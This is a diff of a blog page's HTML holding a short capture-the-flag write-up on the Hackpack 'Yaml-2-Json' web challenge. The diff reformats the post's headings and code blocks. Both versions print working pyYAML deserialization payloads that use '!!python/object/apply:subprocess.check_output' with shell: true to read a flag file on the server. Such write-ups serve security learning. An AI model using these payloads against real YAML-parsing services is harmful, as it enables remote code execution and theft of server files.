@@ -103,7 +103,7 @@
     
     
     "mainEntityOfPage": "true",
-    "wordCount": "189"
+    "wordCount": "192"
   }]
   </script>
 
@@ -333,13 +333,10 @@
   >
     <nav id="TableOfContents">
   <ul>
-    <li>
+    <li><a href="#exploiting-a-deserialize-vunlerability-in-pyyaml">Exploiting a deserialize vunlerability in pyyaml</a>
       <ul>
-        <li>
-          <ul>
-            <li><a href="#exploiting-a-deserialize-vunlerability-in-pyyaml">Exploiting a deserialize vunlerability in pyyaml</a></li>
-          </ul>
-        </li>
+        <li><a href="#enumeration">Enumeration</a></li>
+        <li><a href="#exploitation">Exploitation</a></li>
       </ul>
     </li>
   </ul>
@@ -351,7 +348,7 @@
         </div>
       
       <div class="min-w-0 min-h-0 max-w-prose">
-        <h4 id="exploiting-a-deserialize-vunlerability-in-pyyaml" class="relative group">Exploiting a deserialize vunlerability in pyyaml <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#exploiting-a-deserialize-vunlerability-in-pyyaml" aria-label="Anchor">#</a></span></h4>
+        <h2 id="exploiting-a-deserialize-vunlerability-in-pyyaml" class="relative group">Exploiting a deserialize vunlerability in pyyaml <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#exploiting-a-deserialize-vunlerability-in-pyyaml" aria-label="Anchor">#</a></span></h2>
 <p>Hackpack has recently concluded and we placed 47th out of 447 teams. In this short writeup we look at Yaml-2-Json in the web category</p>
 <p>
 
@@ -367,6 +364,7 @@
   
 
 </p>
+<h3 id="enumeration" class="relative group">Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#enumeration" aria-label="Anchor">#</a></span></h3>
 <p>In this challenge we exploit a code execution vulnerability in pyYaml- a yaml parser and emitter for python. The server is using <a href="https://github.com/yaml/pyyaml/tree/5.3.1">pyYAML</a> and Flask.</p>
 <p>We get a simple web page with an option to parse yaml to json. I thought of using python payloads to get some code execution but they failed at first.</p>
 <p>
@@ -399,12 +397,15 @@
   
 
 </p>
-<p>Sweet, so let’s go for RCE and read our flag from the server</p>
-<p>I used the following payload at first but it fails since subprocess will only accept single commands like <code>whoami, id</code>
-<code>user_input: !!python/object/apply:subprocess.check_output [&amp;#39;cat /tmp/flag.txt&amp;#39;]</code></p>
-<p>My teammate <a href="https://twitter.com/k0imet_">Koimet</a> helped me refine my payload to the following which gives us the flag
-<code>user_input: !!python/object/apply:subprocess.check_output   args: [ cat /tmp/flag.txt ]   kwds: { shell: true }</code>
-
+<p>So let’s go for RCE and read our flag from the server</p>
+<h3 id="exploitation" class="relative group">Exploitation <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#exploitation" aria-label="Anchor">#</a></span></h3>
+<p>I used the following payload at first but it fails since subprocess will only accept single commands like <code>whoami, id</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="n">user_input</span><span class="p">:</span> <span class="err">!!</span><span class="n">python</span><span class="o">/</span><span class="nb">object</span><span class="o">/</span><span class="n">apply</span><span class="p">:</span><span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span> <span class="p">[</span><span class="s1">&#39;cat /tmp/flag.txt&#39;</span><span class="p">]</span>
+</code></pre></div><p>My teammate <a href="https://twitter.com/k0imet_">Koimet</a> helped me refine my payload to the following which gives us the flag</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="n">user_input</span><span class="p">:</span> <span class="err">!!</span><span class="n">python</span><span class="o">/</span><span class="nb">object</span><span class="o">/</span><span class="n">apply</span><span class="p">:</span><span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span>
+       <span class="n">args</span><span class="p">:</span> <span class="p">[</span> <span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flag</span><span class="o">.</span><span class="n">txt</span> <span class="p">]</span>
+       <span class="n">kwds</span><span class="p">:</span> <span class="p">{</span> <span class="n">shell</span><span class="p">:</span> <span class="n">true</span> <span class="p">}</span>
+</code></pre></div><p>
 
 
 
